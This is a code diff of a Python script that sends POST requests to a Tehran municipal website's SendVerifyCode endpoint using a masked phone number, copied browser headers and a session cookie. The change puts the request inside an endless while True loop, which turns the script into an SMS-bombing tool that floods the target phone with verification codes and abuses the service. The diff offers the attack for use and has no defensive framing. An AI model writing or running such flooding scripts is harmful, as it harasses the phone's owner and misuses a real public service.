@@ -5,7 +5,6 @@ from colorama import Fore
 
 url = "https://manshahrdaram.tehran.ir/SendVerifyCode"
 
-payload = "phoneNumber=09*****"
 headers = {
     "Host": "manshahrdaram.tehran.ir",
     "Cookie": ".AspNetCore.Antiforgery.8uKDfNyqTyw=CfDJ8Lmev2UBweRHhb6xY9rsIgmduSQYhfxvTXy8DaKYX4tzca0xmTc-pp8ReitXzhMZIL1DGgr3my9h1DL3_GfFH6P8NbIhnUUJMioT1UmkIpc8iijBwAGGxp7O_gEX9kCiXocpeqiH10fE8K5-0cMjANQ",
@@ -26,10 +25,11 @@ headers = {
     "Accept-Language": "en-US,en;q=0.9"
 }
 
-response = requests.post(url, data=payload, headers=headers)
+while True:
+    payload = "phoneNumber=09****"
+    response = requests.post(url, data=payload, headers=headers)
 
-if response.status_code == 200:
-    print(Fore.GREEN + "Request sent successfully!")
-else:
-    print(Fore.RED + "Error occurred while sending the request.")
-
+    if response.status_code == 200:
+        print(Fore.GREEN + "Request sent successfully!")
+    else:
+        print(Fore.RED + "Error occurred while sending the request.")
